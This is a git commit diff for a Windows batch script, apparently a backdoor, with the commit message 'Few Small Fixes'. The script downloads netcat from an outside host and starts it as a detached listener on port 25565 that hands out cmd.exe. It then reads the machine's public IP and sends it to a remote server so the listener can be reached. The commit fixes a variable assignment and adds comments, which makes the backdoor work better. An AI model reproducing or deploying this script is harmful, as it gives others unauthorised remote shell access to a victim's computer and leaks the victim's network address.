2aebcfff0c46fe9944ecfe353eab88127265b69a
PixelRayn <david.kowalk@gmail.com>
2019-07-10 12:13:54 +0200

    Few Small Fixes
    - Fixed set command for the server ip
    - Added Documentation

--- Batch File/ShellStartupWin10.bat
+++ Batch File/ShellStartupWin10.bat
@@ -2,7 +2,7 @@
 ::mode con: cols=15 lines=1
 
 set file=nc64.exe
-set ip = nodeserver.net;
+set ip=nodeserver.net;
 
 cd ../../../../../../..
 
@@ -13,12 +13,13 @@ if exist %file% (
 
 ) else (
 
-  powershell "wget http://website.net/scripts/nc64.exe -OutFile ~/%file%" && start nc64.exe -d -lp 25565 -e cmd.exe
+  ::Download Netcat from Server
+  powershell "wget http://website.net/scripts/nc64.exe -OutFile ~/%file%" && start %file% -d -lp 25565 -e cmd.exe
 
 )
 
+::Read IP
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
 
-::Ping server to update ip
-::powershell "wget website.net/scripts/server.php?ip=%PublicIP%"
+::Ping ip to server
 start nc64.exe -c "echo %PublicIP%" %ip% 25565
